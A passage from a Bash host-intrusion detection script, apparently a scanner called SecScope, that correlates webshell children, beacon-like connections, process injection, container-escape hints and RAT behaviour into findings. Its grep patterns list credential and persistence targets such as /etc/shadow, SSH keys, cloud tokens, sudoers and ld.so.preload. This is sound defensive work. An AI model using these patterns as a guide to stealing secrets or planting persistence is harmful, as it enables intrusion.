                file_match=$(awk -F '\t' -v suffix="/$base" 'index($2,suffix)>0 && index($2,suffix)==length($2)-length(suffix)+1 {print; exit}' "${RAW_DIR}/file-changes.tsv" 2>/dev/null)
                [ -z "$file_match" ] || reason="${reason}${reason:+,}REQUESTED_CHANGED_WEB_FILE"
            fi
            [ -n "$reason" ] || continue
            [ "$web_context_count" -lt 50 ] || break
            web_context_count=$((web_context_count + 1))
            conn="reason=${reason}; source=${source_file}; method=${method}; uri=${uri}; status=${status}; parse=${parse_status}; changed_file=${file_match:-none}; raw_line_hash=${raw_hash}"
            printf 'web:%s\t%s\t%s\t%s\t%s\tCONTEXT_ONLY_NO_PID\n' \
                "${raw_hash:-$(sha256_text "$conn")}" "${log_time:-unknown}" "${client_ip:-unknown}" "${uri:-unknown}" \
                "$(printf '%s' "$conn" | tr '\t' ' ' | head -c 1200)" >> "$context_file"
            post_static="${post_static}${post_static:+$'\n'}${conn}"
        done < "${RAW_DIR}/web-access-normalized.tsv"
    fi
    while IFS= read -r child_line; do
        pid=$(printf '%s' "$child_line" | awk '{print $1}')
        [[ "$pid" =~ ^[0-9]+$ ]] || continue
        starttime=$(awk '{print $22}' "/proc/${pid}/stat" 2>/dev/null); exe=$(readlink -f "/proc/${pid}/exe" 2>/dev/null || true)
        [ -n "$starttime$exe" ] || continue
        instance="process:$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo unknown):${pid}:${starttime}:${exe}"
        network=$(socket_snapshot established | grep -E "pid=${pid}," | head -10)
        public_network=""
        while IFS= read -r conn; do
            peer=$(printf '%s' "$conn" | awk '{print $6}'); peer_ip=$(endpoint_ip "$peer")
            is_private_or_local_ip "$peer_ip" && continue
            public_network="${public_network}${public_network:+$'\n'}${conn}"
        done <<< "$network"
        persistence=""
        if [ -s "$EVENT_CACHE_FILE" ]; then
            persistence=$(grep -F "\"pid\":\"${pid}\"" "$EVENT_CACHE_FILE" 2>/dev/null | grep -E '(/etc/(cron|systemd|profile|pam[.]d|sudoers|ld[.]so[.]preload)|authorized_keys)' | head -10)
        fi
        starttime_after=$(awk '{print $22}' "/proc/${pid}/stat" 2>/dev/null)
        [ "$starttime" = "$starttime_after" ] || { printf '%s\t\tPID_REUSED_DURING_SCAN\t%s\tprocfs\tPARTIAL\n' "$instance" "$RUN_STARTED_AT" >> "$edge_file"; continue; }
        [ -n "$public_network" ] || continue
        domains="PROCESS,NETWORK"
        printf '%s\tnetwork:%s:%s\tSAME_PROCESS_PUBLIC_CONNECTION\t%s\tprocfs+ss_snapshot\tHIGH\n' \
            "$instance" "$instance" "$(sha256_text "$public_network")" "$RUN_STARTED_AT" >> "$edge_file"
        [ -z "$persistence" ] || {
            domains="${domains},PERSISTENCE"
            printf '%s\tpersistence:%s\tSAME_PROCESS_WRITE_EVENT\t%s\tauditd_or_falco\tMEDIUM\n' \
                "$instance" "$(sha256_text "$persistence")" "$RUN_STARTED_AT" >> "$edge_file"
        }
        domains=$(normalize_evidence_domains "$domains")
        timeline="$RUN_STARTED_AT|PROCESS|$instance web ancestor child=$child_line;$RUN_STARTED_AT|NETWORK|$public_network"
        [ -z "$persistence" ] || timeline="${timeline};$RUN_STARTED_AT|PERSISTENCE|$persistence"
        evidence="process_instance_id=$instance; PROCESS=$child_line; PUBLIC_NETWORK=$public_network; PERSISTENCE=${persistence:-none}; HTTP=context-only-no-pid"
        title='Web 服务派生 Shell/解释器并建立网络连接'
        record_find CRITICAL webshell "$title" "$evidence" '立即保全进程树、连接、访问日志和落地文件并进入应急响应' 'T1505.003' \
            'WEB-SHELL-NETWORK' "$instance" 'web-causal-edges.tsv,process-context.tsv,socket-snapshot.txt,events-normalized.jsonl,web-context-evidence.tsv' \
            'SECURITY_THREAT' HIGH 'Web 祖先进程派生 Shell/解释器且同进程建立连接，是高特异性直接行为证据' \
            '核对授权红队/运维窗口；非授权场景按高置信主机威胁处置' "$domains" \
            "反证：维护窗口=${MAINTENANCE_ACTIVE}；HTTP 日志无 PID，未作为同进程证据" "$timeline"
        add_attack_chain "CHAIN-WEB-SHELL-NETWORK-$(sha256_text "$instance" | cut -c1-12)" "$title" "$domains" "$timeline" "$evidence"
        add_ioc Pattern 'WebShell network chain' "$evidence"
    done < <(web_shell_children | head -20)
    if [ -n "$post_static$changes" ]; then
        title='Web 上下文存在待关联异常'
        evidence="HTTP_CONTEXT=${post_static:-none}; FILE_CONTEXT=${changes:-none}; binding=none"
        timeline="$RUN_STARTED_AT|WEB|${post_static:-no_http};$RUN_STARTED_AT|FILE|${changes:-no_change}"
        record_find MEDIUM webshell "$title" "$evidence" '结合发布窗口和后续进程/网络事件持续研判' 'T1505.003' \
            'WEB-CONTEXT-ANOMALY' 'web-context-unbound' 'web-access-recent.log,web-access-normalized.tsv,file-changes.tsv,web-context-evidence.tsv' \
            'SECURITY_ANOMALY' LOW '日志无 PID 且未有同一写入进程事件，HTTP 与文件变化仅作上下文' \
            '仅当时间窗与 URI/文件映射明确，并补入同进程写入/执行证据才升级' 'WEB,FILE' \
            "反证：维护窗口=${MAINTENANCE_ACTIVE}；无 PID/无因果边" "$timeline"
    fi
    record_raw_status 'web-causal-edges.tsv' "$([ "$(wc -l < "$edge_file")" -gt 1 ] && printf SUCCESS || printf NO_RESULTS)" attack_chain ''
    record_raw_status 'web-context-evidence.tsv' "$([ "$(wc -l < "$context_file")" -gt 1 ] && printf SUCCESS || printf NO_RESULTS)" web ''
}

analyze_beacon_events() {
    local out="${RAW_DIR}/beacon-analysis.tsv" line key exe target port count median mad ratio window
    printf 'entity_key\texecutable\ttarget\tport\tconnection_count\tmedian_interval_seconds\tmad_seconds\tstability_ratio\thistory_window\tassessment\n' > "$out"
    BEACON_HISTORY_FILE="${STATE_DIR}/beacon-history.json"; BEACON_HISTORY_PENDING="${STATE_DIR}/.beacon-history.next.${RUN_ID}"
    [ "$STATE_ENABLED" = true ] || { BEACON_HISTORY_HEALTH=DISABLED; BEACON_STATUS=DISABLED; record_raw_status 'beacon-analysis.tsv' NO_RESULTS patterns ''; return 0; }
    [ -s "$BEACON_HISTORY_FILE" ] && BEACON_HISTORY_HEALTH=HEALTHY || BEACON_HISTORY_HEALTH=LEARNING
    if command -v python3 >/dev/null 2>&1; then
        python3 - "$EVENT_CACHE_FILE" "$BEACON_HISTORY_FILE" "$BEACON_HISTORY_PENDING" "$out" "$HOST_ID" 2>/dev/null <<'PY'
import ipaddress,json,os,statistics,sys,time
events,old_path,next_path,out_path,host_id=sys.argv[1:]
now=int(time.time()); cutoff=now-30*86400; groups={}
if os.path.isfile(old_path):
    try:
        old=json.load(open(old_path,encoding='utf-8'))
        if old.get('host_id')==host_id:
            for row in old.get('tuples',[]): groups[row.get('key','')]=row
    except Exception: pass
if os.path.isfile(events):
    for line in open(events,encoding='utf-8',errors='replace'):
        try: e=json.loads(line)
        except Exception: continue
        if e.get('action')!='connect': continue
        exe=(e.get('exe') or 'unknown').strip(); target=(e.get('target') or '').strip()
        if not target: continue
        host=target.rsplit(':',1)[0].strip('[]'); port=target.rsplit(':',1)[1] if ':' in target else ''
        try:
            if ipaddress.ip_address(host).is_private or ipaddress.ip_address(host).is_loopback: continue
        except Exception: pass
        key=f"{exe.lower()}|{host.lower()}|{port}"
        row=groups.setdefault(key,{'key':key,'executable':exe,'target':host,'port':port,'timestamps':[]})
        row['timestamps'].append(int(e.get('time_epoch') or now))
rows=[]; candidates=[]
for key,row in groups.items():
    times=sorted(set(int(x) for x in row.get('timestamps',[]) if int(x)>=cutoff))[-64:]
    if not times: continue
    row['timestamps']=times; row['first_seen']=time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime(times[0])); row['last_seen']=time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime(times[-1])); rows.append(row)
    if len(times)<5: continue
    gaps=[b-a for a,b in zip(times,times[1:]) if b>a]
    if len(gaps)<4: continue
    med=statistics.median(gaps); mad=statistics.median(abs(x-med) for x in gaps); ratio=mad/med if med else 1
    if 10<=med<=86400 and ratio<=.25:
        candidates.append((key,row['executable'],row['target'],row['port'],len(times),med,mad,ratio,f"{row['first_seen']}..{row['last_seen']}"))
json.dump({'schema_version':1,'host_id':host_id,'updated_at':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'tuples':rows},open(next_path,'w',encoding='utf-8'),ensure_ascii=False,indent=2)
with open(out_path,'a',encoding='utf-8') as out:
    for c in candidates: out.write('\t'.join(str(round(x,3)) if isinstance(x,float) else str(x) for x in c)+'\tperiodic_network_candidate\n')
PY
    else
        BEACON_HISTORY_HEALTH=UNAVAILABLE; BEACON_STATUS=DEGRADED; mark_current_module_partial python3_missing_for_beacon
    fi
    BEACON_OBSERVED=$(python3 -c 'import json,sys;print(len(json.load(open(sys.argv[1])).get("tuples",[])))' "$BEACON_HISTORY_PENDING" 2>/dev/null || echo 0)
    BEACON_CANDIDATES=$(( $(wc -l < "$out" | tr -d ' ') - 1 )); [ "$BEACON_CANDIDATES" -lt 0 ] && BEACON_CANDIDATES=0
    if [ "$BEACON_CANDIDATES" -gt 0 ]; then
        BEACON_STATUS=CANDIDATES
        while IFS=$'\t' read -r key exe target port count median mad ratio window _; do
            [ "$key" = entity_key ] && continue
            record_find MEDIUM network "周期通信候选待研判: $(basename "$exe") → $target:$port" "key=$key; count=$count; median=$median; mad=$mad; stability_ratio=$ratio; history=$window" '核对代理、更新、监控和目标归属；周期性仅计 NETWORK 域，不能单独证明 C2' 'T1071' 'NET-BEACON-CANDIDATE' "$key" 'beacon-analysis.tsv,events-normalized.jsonl' 'SECURITY_ANOMALY' MEDIUM '跨轮至少五次连接且间隔稳定，仅为网络域候选' '同一稳定实体出现进程注入、异常文件、持久化或恶意软件命中时升级' 'NETWORK' '私网和本机目标已降噪'
        done < "$out"
    else BEACON_STATUS=$([ "$BEACON_HISTORY_HEALTH" = LEARNING ] && printf LEARNING || printf READY_NO_CANDIDATE); fi
    [ "$BEACON_CANDIDATES" -gt 0 ] && record_raw_status 'beacon-analysis.tsv' SUCCESS patterns '' || record_raw_status 'beacon-analysis.tsv' NO_RESULTS patterns ''
}

commit_beacon_history() {
    [ "$STATE_ENABLED" = true ] && [ -s "$BEACON_HISTORY_PENDING" ] || return 0
    [ ! -s "$BEACON_HISTORY_FILE" ] || cp "$BEACON_HISTORY_FILE" "${BEACON_HISTORY_FILE}.bak"
    mv "$BEACON_HISTORY_PENDING" "$BEACON_HISTORY_FILE"; chmod 600 "$BEACON_HISTORY_FILE" "${BEACON_HISTORY_FILE}.bak" 2>/dev/null || true
}

correlate_advanced_behaviors() {
    local memory_events escape_events web_sensitive service_ssh archive_net beacon domains pid network user command evidence
    [ -s "$EVENT_CACHE_FILE" ] || return 0
    memory_events=$(grep -E '"action":"(memfd|ptrace|process_vm_writev)"|/proc/[0-9]+/mem' "$EVENT_CACHE_FILE" 2>/dev/null | head -20)
    if [ -n "$memory_events" ]; then
        domains="MEMORY,PROCESS"
        printf '%s' "$memory_events" | grep -q '"domain":"NETWORK"\|connect' && domains="${domains},NETWORK"
        record_find HIGH injection '近期出现进程注入/跨进程内存访问事件' "$memory_events" \
            '核对目标 PID、执行账号、调试工单和后续文件/网络行为' 'T1055' 'MEM-REALTIME-INJECTION' 'realtime-memory-events' \
            'events-normalized.jsonl,process-context.tsv,proc/' 'SECURITY_THREAT' HIGH \
            '实时审计记录了 memfd、ptrace、process_vm_writev 或 /proc/PID/mem 行为；合法调试仍需反证' \
            '若关联异常外连、凭证进程或无包归属工具，应升级并进入响应' "$domains" \
            "反证：维护窗口=${MAINTENANCE_ACTIVE}；需核对调试负责人" "$RUN_STARTED_AT|MEMORY|realtime injection event"
    fi
    escape_events=$(grep -Ei '"action":"(setns|unshare|module_load)"|docker[.]sock|containerd[.]sock|/proc/[^ ]+/ns/|mount' "$EVENT_CACHE_FILE" 2>/dev/null | head -20)
    if [ -n "$escape_events" ]; then
        record_find HIGH process '容器命名空间/运行时 Socket 高风险操作线索' "$escape_events" \
            '核对容器工作负载、执行账号、capabilities 和宿主机命名空间目标' 'T1611' 'CNT-ESCAPE-CONTEXT' 'container-escape-context' \
            'events-normalized.jsonl,process-context.tsv,docker_security.txt' 'SECURITY_ANOMALY' MEDIUM \
            'setns/unshare/mount 或运行时 Socket 访问可用于正常容器管理，也可用于逃逸' \
            '若服务账号或容器进程同时获得宿主机 namespace、特权能力或写入持久化，应升级' 'PROCESS,MEMORY' \
            "反证：主机角色=${HOST_ROLE}；维护窗口=${MAINTENANCE_ACTIVE}" "$RUN_STARTED_AT|PROCESS|namespace/runtime socket activity"
    fi
    web_sensitive=$(grep -Ei '(nginx|apache|httpd|php-fpm|tomcat|java|node|gunicorn|uwsgi|caddy|litespeed).*(/etc/shadow|[.]ssh/|authorized_keys|credentials|[.]aws/|serviceaccount/token|/etc/kubernetes|/etc/sudoers|/etc/cron|/etc/systemd)' "$EVENT_CACHE_FILE" 2>/dev/null | head -20)
    if [ -n "$web_sensitive" ]; then
        domains="WEB,FILE,PROCESS"
        printf '%s' "$web_sensitive" | grep -Eq 'authorized_keys|sudoers|cron|systemd|pam[.]d|ld[.]so[.]preload' && domains="${domains},PERSISTENCE"
        record_find HIGH webshell 'Web 服务上下文访问敏感凭据或持久化文件' "$web_sensitive" \
            '立即核对请求入口、进程树、访问目的和文件是否被修改' 'T1555' 'WEB-SENSITIVE-FILE-ACCESS' 'web-sensitive-file-access' \
            'events-normalized.jsonl,web-access-recent.log,process-context.tsv,file-changes.tsv' 'SECURITY_THREAT' HIGH \
            'Web 进程上下文与敏感凭据/持久化文件访问形成多域关联' \
            '若确认写入、派生 Shell 或外连，应按高置信 Web 入侵处置' "$domains" \
            "反证：维护窗口=${MAINTENANCE_ACTIVE}" "$RUN_STARTED_AT|WEB|web process;$RUN_STARTED_AT|FILE|sensitive access"
    fi
    service_ssh=$(ps -eo pid=,user=,comm=,args= 2>/dev/null | awk '$2 ~ /^(www-data|nginx|apache|httpd|tomcat|jenkins|gitlab-runner|nobody)$/ && $3 ~ /^(ssh|scp|sftp)$/ {print}' | head -20)
    if [ -n "$service_ssh" ]; then
        network=""
        while IFS= read -r pid; do network="${network}$(socket_snapshot all | grep -E "pid=${pid}," | head -10)"; done < <(printf '%s\n' "$service_ssh" | awk '{print $1}')
        record_find HIGH process '服务账号执行 SSH/SCP/SFTP' "process=${service_ssh}; network=${network:-none}" \
            '核对发布/备份任务、目标清单、密钥归属和负责人' 'T1021.004' 'PRS-SERVICE-ACCOUNT-SSH' 'service-account-ssh' \
            'process-context.tsv,ss_established.txt,events-normalized.jsonl' 'SECURITY_ANOMALY' MEDIUM \
            '服务账号远程访问可能属于发布，也可能用于横向移动；必须结合目标数量和授权上下文' \
            '若扫描多个内网管理端口、访问未批准目标或随后写入持久化，应升级' 'PROCESS,NETWORK' \
            "反证：主机角色=${HOST_ROLE}；维护窗口=${MAINTENANCE_ACTIVE}" "$RUN_STARTED_AT|PROCESS|service account ssh;$RUN_STARTED_AT|NETWORK|${network:-none}"
    fi
    archive_net=$(ps -eo pid=,comm=,args= 2>/dev/null | grep -E '^[[:space:]]*[0-9]+[[:space:]]+(tar|zip|7z|rar)[[:space:]]' | grep -v secscope | head -10)
    if [ -n "$archive_net" ]; then
        network=""
        while IFS= read -r pid; do network="${network}$(socket_snapshot established | grep -E "pid=${pid}," | head -5)"; done < <(printf '%s\n' "$archive_net" | awk '{print $1}')
        if [ -n "$network" ]; then
            record_find HIGH process '归档进程与网络连接同时出现' "process=${archive_net}; network=${network}" \
                '核对备份/发布任务、归档内容和连接目的；不要仅凭归档命令判定外传' 'T1560' 'PRS-ARCHIVE-NETWORK' 'archive-network' \
                'process-context.tsv,ss_established.txt,events-normalized.jsonl' 'SECURITY_ANOMALY' MEDIUM \
                '归档与连接形成 FILE/PROCESS/NETWORK 三域，但常见于合法备份，故保留为待研判异常' \
                '若目标为未批准公网地址、归档包含凭据或与陌生登录关联，应升级' 'FILE,PROCESS,NETWORK' \
                "反证：维护窗口=${MAINTENANCE_ACTIVE}；需核对备份负责人" "$RUN_STARTED_AT|FILE|archive created;$RUN_STARTED_AT|NETWORK|$network"
        fi
    fi
    analyze_beacon_events
    beacon=$(tail -n +2 "${RAW_DIR}/beacon-analysis.tsv" 2>/dev/null | head -20)
    if [ -n "$beacon" ]; then
        record_find MEDIUM network '固定周期低频连接候选' "$beacon" \
            '结合进程、目标信誉、业务心跳配置和更长时间窗口确认' 'T1071' 'NET-BEACON-CANDIDATE' 'beacon-candidate' \
            'beacon-analysis.tsv,events-normalized.jsonl,process-context.tsv' 'SECURITY_ANOMALY' LOW \
            '固定周期只是一种统计线索，监控 Agent 和健康检查也会产生相同行为' \
            '若关联新进程、无包归属执行、memfd/临时目录或未批准公网目标，应升级' 'NETWORK' \
            '反证：可能为监控、健康检查或授权 Agent' "$RUN_STARTED_AT|NETWORK|regular interval candidate"
    fi
}

publish_rat_snapshot_events() {
    local now pid ppid uid exe instance line peer evidence_file
    [ -n "$EVENT_CACHE_FILE" ] || EVENT_CACHE_FILE="${RAW_DIR}/events-normalized.jsonl"
    [ -e "$EVENT_CACHE_FILE" ] || : > "$EVENT_CACHE_FILE"
    now=$(date +%s)
    if [ -r "${RAW_DIR}/process-context.tsv" ]; then
        while IFS=$'\t' read -r instance _boot pid _start ppid _comm uid _euid _loginuid _tty exe _rest; do
            [ "$instance" = process_instance_id ] && continue
            [[ "$pid" =~ ^[0-9]+$ ]] || continue
            append_normalized_event "$now" snapshot process_snapshot PROCESS "$pid" "$ppid" "$uid" "$exe" "" "" 'read-only /proc process inventory' "snapshot-process:${instance}"
            for evidence_file in "${RAW_DIR}/crontab_all.txt" "${RAW_DIR}/systemd_services.txt" "${RAW_DIR}/startup_files.txt"; do
                [ -r "$evidence_file" ] || continue
                [ -n "$exe" ] && grep -Fq -- "$exe" "$evidence_file" 2>/dev/null || continue
                append_normalized_event "$now" snapshot persistence_reference PERSISTENCE "$pid" "$ppid" "$uid" "$exe" "$evidence_file" "" 'same executable path is referenced by a persistence object; presence is not a change claim' "snapshot-persistence:$(sha256_text "$instance|$evidence_file")"
            done
        done < "${RAW_DIR}/process-context.tsv"
    fi
    collect_socket_snapshot_once
    while IFS= read -r line; do
        [[ "$line" =~ pid=([0-9]+), ]] || continue
        pid="${BASH_REMATCH[1]}"; [ -r "/proc/${pid}/stat" ] || continue
        ppid=$(awk '{print $4}' "/proc/${pid}/stat" 2>/dev/null); uid=$(awk '/^Uid:/ {print $2;exit}' "/proc/${pid}/status" 2>/dev/null)
        exe=$(readlink -f "/proc/${pid}/exe" 2>/dev/null || true); peer=$(printf '%s' "$line" | awk '{print $6}')
        [ -n "$peer" ] || continue
        append_normalized_event "$now" snapshot connect NETWORK "$pid" "$ppid" "$uid" "$exe" "" "$peer" "$line" "snapshot-network:$(sha256_text "$pid|$peer|$line")"
    done < "$SOCKET_SNAPSHOT_FILE"
    if [ -r "${RAW_DIR}/beacon-analysis.tsv" ]; then
        python3 - "$EVENT_CACHE_FILE" "${RAW_DIR}/beacon-analysis.tsv" "$now" <<'PY' 2>/dev/null || true
import csv,hashlib,json,sys,time
out,source,epoch=sys.argv[1],sys.argv[2],int(sys.argv[3])
with open(out,'a',encoding='utf-8') as target,open(source,encoding='utf-8',errors='replace') as rows:
    reader=csv.DictReader(rows,delimiter='\t')
    for row in reader:
        entity=row.get('entity_key',''); destination=(row.get('target','')+':'+row.get('port','')).strip(':')
        if not entity or not destination: continue
        event_id='beacon:'+hashlib.sha256((entity+'|'+destination).encode()).hexdigest()[:20]
        target.write(json.dumps({'event_id':event_id,'source':'beacon_history','timestamp_utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime(epoch)),'entity_type':'PROCESS','entity_id':entity,'process_instance_id':entity,'parent_instance_id':'','file_entity_id':'','network_flow_id':'network:'+entity+'|'+destination,'site_id':'','request_id':'','evidence_domain':'BEACON','confidence':'STATISTICAL_CANDIDATE','raw_reference':'raw/beacon-analysis.tsv','action':'beacon_candidate','destination':destination,'details':row},sort_keys=True)+'\n')
PY
    fi
    record_raw_status 'events-normalized.jsonl' SUCCESS patterns ''
}

run_rat_detection_engine() {
    local findings="${RAW_DIR}/rat-findings.jsonl" profiles="${RAW_DIR}/rat-connection-profiles.jsonl" graph="${RAW_DIR}/rat-evidence-graph.json" targets="${RAW_DIR}/threat-intel-targets.txt" intel="${RAW_DIR}/threat-intel-results.jsonl" intel_status="${RAW_DIR}/threat-intel-status.json" summary="${RAW_DIR}/rat-engine-summary.json" rc=0
    publish_rat_snapshot_events
    if ! command -v python3 >/dev/null 2>&1 || [ ! -r "$RAT_ENGINE_PATH" ] || [ ! -r "$THREAT_INTEL_PATH" ]; then
        printf '{"detector":"SecScope.RATDetectionEngine","status":"UNAVAILABLE"}\n' > "$findings"
        RAT_STATUS=UNAVAILABLE; THREAT_INTEL_STATUS=THREAT_INTEL_UNAVAILABLE
        record_raw_status 'rat-findings.jsonl' UNAVAILABLE patterns 'python3 or RAT helper missing'; mark_current_module_partial rat_engine_unavailable; return 0
    fi
    python3 - "$EVENT_CACHE_FILE" > "$targets" <<'PY'
import json,sys
seen=set()
for line in open(sys.argv[1],encoding='utf-8',errors='replace'):
    try:r=json.loads(line)
    except Exception:continue
    value=str(r.get('destination') or r.get('target') or '')
    if value and value not in seen:seen.add(value);print(value)
PY
    run_with_timeout 30 python3 "$THREAT_INTEL_PATH" --targets-file "$targets" --local-ioc "$THREAT_INTEL_IOC_FILE" --local-allow "$THREAT_INTEL_ALLOW_FILE" --output-jsonl "$intel" --status-json "$intel_status" --max-queries 250 > "${RAW_DIR}/threat-intel-summary.json" 2>&1 || mark_current_module_partial threat_intel_adapter_failed
    THREAT_INTEL_STATUS=$(python3 -c 'import json,sys;print(json.load(open(sys.argv[1])).get("overall","THREAT_INTEL_UNAVAILABLE"))' "$intel_status" 2>/dev/null || printf THREAT_INTEL_UNAVAILABLE)
    run_with_timeout 180 python3 "$RAT_ENGINE_PATH" --binary-jsonl "${RAW_DIR}/binary-analysis.jsonl" --events-jsonl "$EVENT_CACHE_FILE" --intel-jsonl "$intel" --output-findings "$findings" --output-profiles "$profiles" --output-graph "$graph" > "$summary" 2>&1 || rc=$?
    RAT_FINDING_COUNT=$(wc -l < "$findings" 2>/dev/null | tr -d ' '); RAT_FINDING_COUNT=${RAT_FINDING_COUNT:-0}
    RAT_HIGH_COUNT=$(python3 - "$findings" <<'PY' 2>/dev/null || echo 0
import json,sys
print(sum(1 for x in open(sys.argv[1],encoding='utf-8',errors='replace') if json.loads(x).get('severity') in ('HIGH','CRITICAL')))
PY
    )
    while IFS=$'\t' read -r severity ftype confidence score entity domains reasons counter gaps hypotheses event_ids; do
        [ -n "$entity" ] || continue
        record_find "$severity" rat "RAT 行为证据链待研判（评分 ${score}）" \
            "entity=$entity; reasons=$reasons; family_hypotheses=${hypotheses:-none}; event_ids=$event_ids; visibility_gaps=$gaps" \
            '保全文件、进程、网络、内存和持久化证据；确认恶意前不自动终止或删除' 'T1219' \
            'RAT-CORRELATED-BEHAVIOR' "$entity" 'rat-findings.jsonl,rat-evidence-graph.json,rat-connection-profiles.jsonl,threat-intel-status.json' "$ftype" "$confidence" \
            "同一稳定进程实例的独立事件/数据源经 RAT 门禁评分；家族名仅为配置相似假设" \
            '确认恶意哈希、Defender 命中，或同实体注入+C2+持久化时升级' "$domains" \
            "counter_evidence=${counter:-none}; ${THREAT_INTEL_STATUS}" "$RUN_STARTED_AT|RAT|score=$score entity=$entity"
    done < <(python3 - "$findings" <<'PY'
import json,sys
for line in open(sys.argv[1],encoding='utf-8',errors='replace'):
    try:r=json.loads(line)
    except Exception:continue
    def c(v):
        if isinstance(v,list):v=';'.join(str(x) for x in v)
        return str(v or '').replace('\t',' ').replace('\n',' ')
    print('\t'.join(c(r.get(k)) for k in ('severity','finding_type','confidence','risk_score','entity_id','evidence_domains','judgment_reasons','possible_false_positives','visibility_gaps','family_hypotheses','event_ids')))
PY
    )
    chmod 600 "$findings" "$profiles" "$graph" "$targets" "$intel" "$intel_status" "$summary" 2>/dev/null || true
    if [ "$rc" -eq 0 ]; then RAT_STATUS=SUCCESS; record_raw_status 'rat-findings.jsonl' "$([ "$RAT_FINDING_COUNT" -gt 0 ] && printf SUCCESS || printf NO_RESULTS)" patterns ''
    else RAT_STATUS=PARTIAL; record_raw_status 'rat-findings.jsonl' PARTIAL patterns "rat_engine_exit_${rc}"; mark_current_module_partial "rat_engine_exit_${rc}"; fi
    record_raw_status 'rat-evidence-graph.json' "$RAT_STATUS" patterns ''; record_raw_status 'rat-connection-profiles.jsonl' "$RAT_STATUS" network ''
    record_raw_status 'threat-intel-status.json' "$([ "$THREAT_INTEL_STATUS" = THREAT_INTEL_UNAVAILABLE ] && printf UNAVAILABLE || printf SUCCESS)" network "$THREAT_INTEL_STATUS"
}

#==============================================================================
# 07 — 文件系统
#==============================================================================

secscope_release_dir_trusted() {
    local dir="$1" expected actual
    [ -r "${dir}/secscope.sh" ] && [ -r "${dir}/secscope.sh.sha256" ] || return 1
    expected=$(awk '{print $1; exit}' "${dir}/secscope.sh.sha256" 2>/dev/null)
    actual=$(sha256_file "${dir}/secscope.sh" 2>/dev/null || true)
    [ -n "$expected" ] && [ "$expected" = "$actual" ]
}

is_secscope_generated_path() {
    local path="$1" base release_dir rel
    base="${path##*/}"
    [[ "$base" == ._* ]] && return 0
    [ "$base" = ".secscope-report-root" ] && return 0
    case "$path" in
        "${PROGRAM_DIR}/secscope.sh"|"${PROGRAM_DIR}/secscope.sh.sha256"|"${PROGRAM_DIR}/modules/profile.sh"|"${PROGRAM_DIR}/modules/yara.sh"|"${OUTPUT_DIR}"|"${OUTPUT_DIR}"/*) return 0 ;;
    esac
    # 仅当同目录 secscope.sh 与发布校验值一致时，才抑制 SecScope 自身的固定发布文件和报告。
    # 避免攻击者仅创建一个名为 secscope-v* 的目录绕过文件监控。
    if [[ "$path" =~ ^(.*/secscope-v[0-9][^/]*)/(.*)$ ]]; then
        release_dir="${BASH_REMATCH[1]}"; rel="${BASH_REMATCH[2]}"
        if secscope_release_dir_trusted "$release_dir"; then
            case "$rel" in
                secscope.sh|secscope.sh.sha256|modules/profile.sh|modules/yara.sh|systemd/secscope.service|systemd/secscope@.service|secscope.timer|secscope-fast.timer|secscope-daily.timer|secscope-full.timer|reports/*) return 0 ;;
            esac
        fi
    fi
    return 1
}

collect_temp_code_candidates() {
    local path desc meta running exe_link count=0
    while IFS= read -r -d '' path; do
        is_secscope_generated_path "$path" && continue
        if command -v file >/dev/null 2>&1; then
            desc=$(file -b -- "$path" 2>/dev/null || echo unknown)
        else
            desc="type-unavailable"
        fi
        # /dev/shm 常见 IPC/共享内存文件可能错误带执行位；只有代码型文件才进入告警。
        if [[ "$path" == /dev/shm/* ]] && ! printf '%s' "$desc" | grep -qiE 'ELF|script|executable|shared object|Mach-O'; then
            continue
        fi
        if ! printf '%s' "$desc" | grep -qiE 'ELF|script|executable|shared object|Mach-O' && [ "$desc" != "type-unavailable" ]; then
            continue
        fi
        meta=$(stat -c 'mode=%A owner=%U:%G size=%s mtime=%y' -- "$path" 2>/dev/null || \
            stat -f 'mode=%Sp owner=%Su:%Sg size=%z mtime=%Sm' -t '%Y-%m-%dT%H:%M:%S%z' -- "$path" 2>/dev/null || echo 'metadata=unavailable')
        running="no"
        if [ "$FILE_CONTEXT_INDEX_READY" = true ] && [ -n "${FILE_PROCESS_PID_INDEX[$path]:-}" ]; then
            running="pid=${FILE_PROCESS_PID_INDEX[$path]%%,*}"
        else
            for exe_link in /proc/[0-9]*/exe; do
                [ "$(readlink "$exe_link" 2>/dev/null)" = "$path" ] && { running="pid=${exe_link#/proc/}"; running="${running%/exe}"; break; }
            done
        fi
        printf '%s\t%s\t%s\t%s\n' "$path" "$desc" "$meta" "$running"
        count=$((count + 1))
        [ "$count" -ge 30 ] && break
    done < <(find /tmp /dev/shm /var/tmp -xdev -type f -perm -111 -print0 2>/dev/null)
}

file_scan_config_warning() {
    local key="$1" value="$2" warning
    warning="${key}=${value}"
    FILE_SCAN_CONFIG_STATUS=PARTIAL
    FILE_SCAN_CONFIG_WARNINGS="${FILE_SCAN_CONFIG_WARNINGS}${FILE_SCAN_CONFIG_WARNINGS:+,}${warning}"
    mark_current_module_partial "file_scan_config_invalid:${key}"
}

prepare_file_scan_matchers() {
    local item
    FILE_SCAN_ROOT_ARRAY=(); FILE_EXCLUDE_ARRAY=()
    IFS=',' read -r -a FILE_SCAN_ROOT_ARRAY <<< "$FILE_SCAN_ROOTS"
    IFS=',' read -r -a FILE_EXCLUDE_ARRAY <<< "$FILE_EXCLUDE_NAMES"
    FILE_EXTENSIONS_NORMALIZED=$(printf '%s' ",${FILE_EXTENSIONS//[[:space:]]/}," | tr '[:upper:]' '[:lower:]')
    for item in "${!FILE_SCAN_ROOT_ARRAY[@]}"; do FILE_SCAN_ROOT_ARRAY[$item]="${FILE_SCAN_ROOT_ARRAY[$item]%/}"; done
}

load_file_scan_config() {
    local config_dir="${SECSCOPE_CONFIG_DIR:-/etc/secscope}" key value
    FILE_SCAN_CONFIG_STATUS=DEFAULTS; FILE_SCAN_CONFIG_WARNINGS=""
    FILE_PRIORITY_ADDED_SMALL=100; FILE_PRIORITY_MODIFIED=80; FILE_PRIORITY_RUNTIME_EXE=120
    FILE_PRIORITY_RUNTIME_MAPPED=110; FILE_PRIORITY_WEB_ROOT=70; FILE_PRIORITY_TMP_EXECUTABLE=90
    FILE_PRIORITY_PERSISTENCE_PATH=100; FILE_PRIORITY_RECENT=50; FILE_PRIORITY_SUSPICIOUS_EXTENSION=40
